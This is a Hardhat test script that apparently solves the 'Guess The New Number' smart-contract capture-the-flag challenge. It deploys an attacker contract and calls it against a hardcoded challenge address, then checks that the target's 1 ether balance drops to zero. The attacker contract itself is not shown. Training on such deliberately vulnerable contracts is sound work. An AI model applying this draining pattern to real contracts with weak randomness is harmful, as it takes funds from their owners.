const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("GuessTheNewNumberChallenge", function () {

    // async function deployFixture() {
    //   const [owner] = await ethers.getSigners();
    //   const instance = await ethers.getContractAt("NicknameChallenge", "0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee");
 
    //   return { instance, owner };
    // }
     

    describe("Guessing", function () {
        it("Should Guess the random number", async function () {
            const [owner] = await ethers.getSigners();
            const instanceAddr = "0x9177221819076eD54756A508bc0Ef5bc1DedbF29";
           
            const Attacker = await ethers.getContractFactory("GuessTheNewNumberAttacker");
            const attacker = await Attacker.deploy();
            await attacker.deployed();

            console.log(`Deployed attacker at ${attacker.address}`)
            
            // Checking that the contract has 1 ether balance on deployment.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("1"));

            await attacker.connect(owner).attack(instanceAddr, {value: ethers.utils.parseEther("1.05")});

            // Checking win condition.
            expect(await ethers.provider.getBalance(instanceAddr)).to.be.eq(ethers.utils.parseEther("0"))

        });
    });


});
  